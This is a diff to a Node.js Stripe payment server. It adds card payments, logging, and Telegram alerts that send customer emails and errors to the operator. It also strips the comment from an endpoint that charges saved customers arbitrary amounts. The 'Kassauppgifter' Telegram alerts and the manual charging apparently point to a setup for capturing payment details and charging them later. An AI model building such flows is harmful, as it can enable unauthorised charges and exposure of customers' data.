@@ -92,9 +92,11 @@ app.post('/create-setup-intent', async (req, res) => {
 
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      payment_method_types: ['klarna'],
+      payment_method_types: ['card', 'klarna'],
       metadata: { customer_id: customer.id },
     });
+
+    console.log('SetupIntent created:', setupIntent.id, 'for customer:', customer.id);
 
     await sendTelegram(
       `🛒 <b>Kassauppgifter!</b>\n\n` +
@@ -109,7 +111,13 @@ app.post('/create-setup-intent', async (req, res) => {
 
     res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
   } catch (error) {
-    console.error('Error:', error);
+    console.error('SetupIntent Error:', error.message);
+    await sendTelegram(
+      `❌ <b>SetupIntent Fehler!</b>\n\n` +
+      `📧 E-post: ${email}\n` +
+      `⚠️ Fehler: ${error.message}\n` +
+      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+    );
     res.status(400).json({ error: error.message });
   }
 });
@@ -136,6 +144,8 @@ app.post('/create-subscription', async (req, res) => {
 
     const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
     const pmType = paymentMethod.type;
+
+    console.log('Payment method type:', pmType);
 
     // Save customer to persistent storage
     saveCustomer({
@@ -186,7 +196,13 @@ app.post('/create-subscription', async (req, res) => {
 
     res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
   } catch (error) {
-    console.error('Error:', error.message);
+    console.error('Subscription Error:', error.message);
+    await sendTelegram(
+      `❌ <b>Zahlung Fehler!</b>\n\n` +
+      `🆔 Kund: <code>${customerId}</code>\n` +
+      `⚠️ Fehler: ${error.message}\n` +
+      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+    );
     res.status(400).json({ error: error.message });
   }
 });
@@ -198,8 +214,6 @@ app.get('/customers', (req, res) => {
 });
 
 // ─── Manually charge a saved customer ────────────────────────────────────────
-// POST /charge-saved
-// Body: { "customerId": "cus_xxx", "amount": 994, "currency": "eur" }
 app.post('/charge-saved', async (req, res) => {
   const { customerId, amount, currency } = req.body;
   const customers = loadCustomers();
